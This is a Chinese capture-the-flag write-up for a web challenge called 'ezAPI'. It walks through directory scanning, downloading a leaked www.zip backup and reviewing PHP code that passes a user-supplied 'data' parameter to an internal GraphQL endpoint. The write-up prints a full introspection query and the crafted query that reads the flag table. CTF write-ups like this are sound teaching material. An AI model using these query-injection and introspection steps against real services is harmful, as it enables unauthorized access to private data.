



![img](https://peekaboo.show/content/images/2022/11/807c18bb11faaa6a722bdef4c6235e52.png)



# Week2 ezAPI 200





#### 0、知识点与工具

>   graphql 查询

>   目录扫描工具：御剑



#### 1、页面情况

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117142929.png)



‌

>   页面很简洁就一个输入框，可以输入用户的id

>   测试后发现用户id的范围为：1~6，超出这个范围会返回这个信息

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117143243.png)



‌

##### 查看源代码，发现一条“提示信息？”，看不懂

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/ctfImg/NewStarCTF/Week3/1000000000000006.png)



#### 2、使用御剑扫描一下网址目录

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/7WBHY%7BB$$RP7%7B%60%7B2FLN%5B9%606.png)



‌

>   访问下载www.zip

#### 3、分析其中的php代码

‌

```php
<?php
    error_reporting(0);

    // 传入参数id
    $id = $_POST['id'];


    // $str = $id
    // 对id进行过滤，id中必须含有数字，非数字部分会被替换为空
    function waf($str)
    {
        if (!is_numeric($str) || preg_replace("/[0-9]/", "", $str) !== "") {
            return False;
        } else {
            return True;
        }
    }

    // 发送查询的数据并返回结果
    function send($data)
    {
        $options = array(
            'http' => array(
                'method' => 'POST',
                'header' => 'Content-type: application/json',
                'content' => $data,
                'timeout' => 10 * 60
            )
        );

        $context = stream_context_create($options);
        $result = file_get_contents("http://graphql:8080/v1/graphql", false, $context);
        return $result;
    }

    // 首先判断id是否为空
    if (isset($id)) {

        // id进行waf过滤
        if (waf($id)) {

            // 需要在传入一个参数data, 会根据data是否为空执行代码
            // 如果data不为空，使用data的值，为空使用默认的值
                /**
                * '{
                *       "query":"query{
                *           users_user_by_pk(id:' . $id . ') {
                *                name
                *           }
                *        }", 
                *        "variables":null
                *  }';
                * 
                * 
                */
            isset($_POST['data']) ? $data = $_POST['data'] : $data = '{"query":"query{\nusers_user_by_pk(id:' . $id . ') {\nname\n}\n}\n", "variables":null}';

            // 接收结果并将结果对JSON格式的字符串进行解码
            $res = json_decode(send($data));

            // 查询结果中的name不为空就将其展示到页面上，否则输出找不到
            if ($res->data->users_user_by_pk->name !== NULL) {
                echo "ID: " . $id . "<br>Name: " . $res->data->users_user_by_pk->name;
            } else {
                echo "<b>Can't found it!</b><br><br>DEBUG: ";
                var_dump($res->data);
            }
        } else {
            die("<b>Hacker! Only Number!</b>");
        }
    } else {
        die("<b>No Data?</b>");
    }
?>
```



‌

>   关于graphql查询，有一种查询方式可以查询所有该API端点的所有信息

‌

```
{"query":"\n    query IntrospectionQuery {\r\n      __schema {\r\n        queryType { name }\r\n        mutationType { name }\r\n        subscriptionType { name }\r\n        types {\r\n          ...FullType\r\n        }\r\n        directives {\r\n          name\r\n          description\r\n          locations\r\n          args {\r\n            ...InputValue\r\n          }\r\n        }\r\n      }\r\n    }\r\n\r\n    fragment FullType on __Type {\r\n      kind\r\n      name\r\n      description\r\n      fields(includeDeprecated: true) {\r\n        name\r\n        description\r\n        args {\r\n          ...InputValue\r\n        }\r\n        type {\r\n          ...TypeRef\r\n        }\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      inputFields {\r\n        ...InputValue\r\n      }\r\n      interfaces {\r\n        ...TypeRef\r\n      }\r\n      enumValues(includeDeprecated: true) {\r\n        name\r\n        description\r\n        isDeprecated\r\n        deprecationReason\r\n      }\r\n      possibleTypes {\r\n        ...TypeRef\r\n      }\r\n    }\r\n\r\n    fragment InputValue on __InputValue {\r\n      name\r\n      description\r\n      type { ...TypeRef }\r\n      defaultValue\r\n    }\r\n\r\n    fragment TypeRef on __Type {\r\n      kind\r\n      name\r\n      ofType {\r\n        kind\r\n        name\r\n        ofType {\r\n          kind\r\n          name\r\n          ofType {\r\n            kind\r\n            name\r\n            ofType {\r\n              kind\r\n              name\r\n              ofType {\r\n                kind\r\n                name\r\n                ofType {\r\n                  kind\r\n                  name\r\n                  ofType {\r\n                    kind\r\n                    name\r\n                  }\r\n                }\r\n              }\r\n            }\r\n          }\r\n        }\r\n      }\r\n    }\r\n  ","variables":null}
```



>   然后将上面这个放入data中，然后去执行就会返回所有信息，然后在返回信息中搜索一下flag

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117161755.png)



>   这样就找到flag所在的类的名称：ffffllllaaagggg_1n_h3r3_flag

>   然后在构造data查询

‌

```
{"query":"query{\nffffllllaaagggg_1n_h3r3_flag{\nflag\n}\n}\n", "variables":null}

// 直观点查看
{
	"query":"query{
    		ffffllllaaagggg_1n_h3r3_flag{
            	flag
            }
    	}",
    "variables":null
}
```



#### 4、结果

‌



![img](https://peekab.oss-cn-hangzhou.aliyuncs.com/image/20221117162630.png)



‌

>   关于graphql的资料可以看看这个

‌

[玩转graphQL这是酒仙桥六号部队的第118篇文章-玩转graphQL。全文共计4257个字，预计阅读时长12分钟。![img](https://res.wx.qq.com/a/wx_fed/assets/res/OTE0YTAw.png)微信公众平台先锋情报站![img](http://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s54B52X8UPybZgzLeupG5ic16ibqicJicrq3dpBdZunVJWrxHsbNG53Eyiaiaibh6p2b523z6Jvpu8KTtaPTw/0?wx_fmt=jpeg)](https://mp.weixin.qq.com/s/gp2jGrLPllsh5xn7vn9BwQ)



‌

